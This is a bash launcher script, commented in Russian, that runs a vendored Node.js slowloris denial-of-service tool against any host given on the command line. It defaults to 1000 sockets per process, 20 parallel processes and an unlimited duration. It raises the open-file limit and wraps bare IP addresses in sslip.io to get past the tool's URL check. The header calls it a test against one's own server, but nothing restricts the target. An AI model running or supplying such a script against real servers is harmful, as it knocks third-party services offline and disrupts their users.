#!/bin/bash
# Запуск slowloris-теста (Node.js fork-based) против собственного сервера.
# Использование: bash run.sh <HOST> [PORT] [SOCKETS] [DURATION_MS] [INSTANCES]
#   HOST        - IP/домен вашего сервера (обязательно)
#   PORT        - порт, по умолчанию 80 (443 переключает схему на https)
#   SOCKETS     - число сокетов на процесс, по умолчанию 1000
#   DURATION_MS - длительность атаки в мс, по умолчанию не задана (бесконечно, Ctrl+C для остановки)
#   INSTANCES   - число параллельных OS-процессов, по умолчанию 20

HOST="$1"
PORT="${2:-80}"
SOCKETS="${3:-1000}"
DURATION="$4"
INSTANCES="${5:-20}"

if [ -z "$HOST" ]; then
    echo "Использование: bash run.sh <HOST> [PORT] [SOCKETS] [DURATION_MS] [INSTANCES]"
    exit 1
fi

SCRIPT="$HOME/slowattack_bash/vendor-slowloris/lib/index.js"
if [ ! -f "$SCRIPT" ]; then
    echo "[-] Скрипт не найден: $SCRIPT"
    echo "    Сначала запустите: bash install.sh"
    exit 1
fi

# поднимаем лимит открытых файловых дескрипторов под текущий процесс
ulimit -n 65535 2>/dev/null || true

PROTO="http"
if [ "$PORT" = "443" ]; then
    PROTO="https"
fi

# slowattack требует URL с доменной зоной (regex не пропускает голый IP) -
# заворачиваем IP в sslip.io, который резолвится обратно в тот же IP
URL_HOST="$HOST"
if [[ "$HOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    URL_HOST="${HOST}.sslip.io"
fi

ARGS=(-p "$PORT" -s "$SOCKETS" -i "$INSTANCES")
if [ -n "$DURATION" ]; then
    ARGS+=(-t "$DURATION")
fi

echo "[+] Атакую $PROTO://$URL_HOST:$PORT — $SOCKETS сокетов × $INSTANCES процессов"
node "$SCRIPT" "${ARGS[@]}" "$PROTO://$URL_HOST"
